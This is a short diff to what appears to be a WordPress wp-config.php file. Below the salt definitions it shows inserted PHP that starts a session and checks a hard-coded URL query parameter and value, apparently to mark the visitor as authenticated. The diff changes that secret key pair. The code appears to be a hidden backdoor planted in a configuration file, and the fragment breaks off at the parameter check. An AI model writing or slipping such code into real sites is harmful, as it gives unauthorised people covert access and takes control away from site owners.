@@ -66,8 +66,8 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 session_start(); 
-$expected_param = 'tarutung';
-$expected_value = 'utung';
+$expected_param = 'iainlangsa';
+$expected_value = 'iainlangsa';
 $is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
 
 if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
